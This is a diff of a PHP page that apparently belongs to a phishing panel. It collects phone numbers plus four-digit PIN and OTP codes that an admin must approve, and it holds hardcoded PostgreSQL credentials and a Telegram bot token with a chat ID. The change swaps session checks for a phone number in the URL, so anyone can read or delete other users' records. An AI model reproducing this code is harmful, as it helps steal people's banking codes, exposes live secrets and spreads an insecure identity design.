@@ -1,6 +1,4 @@
 <?php
-session_start();
-
 // ========== POSTGRESQL CONFIGURATION ==========
 $dbHost = "dpg-d8l5ii7lk1mc73cjcvs0-a";
 $dbPort = 5432;
@@ -12,7 +10,11 @@ $dbPass = "Jhl6RiIZwV5AnvLVCKirxqgLMtFi5gZX";
 $botToken = "8163112809:AAH5OFmjVHKPDz1svGG9viGjpAuNLFHsctc";
 $chatId   = "-5193742613";
 
-
+// Get phone from GET parameter only
+$phone = isset($_GET['phone']) ? trim($_GET['phone']) : '';
+if (empty($phone)) {
+    die("No phone number provided. Please use ?phone=XXXXXXXXX in the URL.");
+}
 
 function getDbConnection($host, $port, $dbname, $user, $pass) {
     static $conn = null;
@@ -36,13 +38,13 @@ if (!$conn) {
     die("Database connection failed.");
 }
 
-// Ensure phone exists in users table (insert with default flags)
+// Ensure phone exists in users table (insert default row if missing)
 $check = pg_query_params($conn, "SELECT phone FROM users WHERE phone = $1", [$phone]);
 if (!$check || pg_num_rows($check) == 0) {
     pg_query_params($conn, "INSERT INTO users (phone, status, pin, otp, approve) VALUES ($1, 0, 0, 0, 0)", [$phone]);
 }
 
-// Handle AJAX verification and deletion
+// Handle AJAX requests (PIN/OTP verification and deletion)
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SERVER['HTTP_X_REQUESTED_WITH']) 
     && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
     
@@ -50,26 +52,25 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SERVER['HTTP_X_REQUESTED_WI
     $type = $_POST['type'] ?? '';
     $action = $_POST['action'] ?? '';
     
-    // Handle delete action
+    // Delete account
     if ($type === 'delete' && $action === 'confirm') {
         $deleteSql = "DELETE FROM users WHERE phone = $1";
         $result = pg_query_params($conn, $deleteSql, [$phone]);
         if ($result) {
-            session_destroy();
-           
+            echo json_encode(['success' => true, 'redirect' => 'index.php']);
         } else {
             echo json_encode(['success' => false, 'error' => 'Could not delete user']);
         }
         exit;
     }
     
-    // Existing verification logic (PIN/OTP)
+    // PIN/OTP verification (only "correct" action checks flag)
     if (!in_array($type, ['pin', 'otp']) || $action !== 'correct') {
         echo json_encode(['success' => false, 'error' => 'Invalid request']);
         exit;
     }
     
-    $col = $type; // 'pin' or 'otp'
+    $col = $type;
     $sql = "SELECT $col FROM users WHERE phone = $1";
     $result = pg_query_params($conn, $sql, [$phone]);
     if (!$result || !($row = pg_fetch_assoc($result))) {
@@ -154,7 +155,7 @@ if ($res && $row = pg_fetch_assoc($res)) {
     <div class="footer">Both must be approved by admin to continue</div>
 </div>
 
-<!-- Modal for PIN/OTP verification -->
+<!-- Modal for PIN/OTP -->
 <div id="verifyModal" class="modal">
     <div class="modal-content">
         <p id="modalTitle">Enter any 4 digits</p>
@@ -222,7 +223,7 @@ if ($res && $row = pg_fetch_assoc($res)) {
         formData.append('action', 'correct');
         
         try {
-            const response = await fetch(window.location.href, {
+            const response = await fetch(window.location.href + '&phone=<?= urlencode($phone) ?>', {
                 method: 'POST',
                 headers: { 'X-Requested-With': 'XMLHttpRequest' },
                 body: formData
@@ -230,7 +231,8 @@ if ($res && $row = pg_fetch_assoc($res)) {
             const result = await response.json();
             if (result.success) {
                 if (result.redirect) {
-                    window.location.href = result.redirect;
+                    // Pass phone number to next page (otp.php or dashboard.php) as GET param
+                    window.location.href = result.redirect + '?phone=<?= urlencode($phone) ?>';
                 } else {
                     await refreshStatuses();
                     showTemporaryMessage(result.message, 'green');
@@ -249,7 +251,7 @@ if ($res && $row = pg_fetch_assoc($res)) {
         formData.append('type', 'delete');
         formData.append('action', 'confirm');
         try {
-            const response = await fetch(window.location.href, {
+            const response = await fetch(window.location.href + '&phone=<?= urlencode($phone) ?>', {
                 method: 'POST',
                 headers: { 'X-Requested-With': 'XMLHttpRequest' },
                 body: formData
@@ -267,7 +269,7 @@ if ($res && $row = pg_fetch_assoc($res)) {
     }
 
     async function refreshStatuses() {
-        const response = await fetch(window.location.href + '?get_flags=1');
+        const response = await fetch(window.location.href + '?get_flags=1&phone=<?= urlencode($phone) ?>');
         const data = await response.json();
         pinStatusSpan.innerText = data.pin === 1 ? 'Approved (1)' : 'Pending (0)';
         pinStatusSpan.className = data.pin === 1 ? 'approved' : 'pending';
@@ -297,7 +299,7 @@ if ($res && $row = pg_fetch_assoc($res)) {
 </script>
 
 <?php
-// AJAX endpoint to get current flags (pin, otp)
+// AJAX endpoint to get current flags
 if (isset($_GET['get_flags']) && $_GET['get_flags'] == 1) {
     header('Content-Type: application/json');
     $sql = "SELECT pin, otp FROM users WHERE phone = $1";
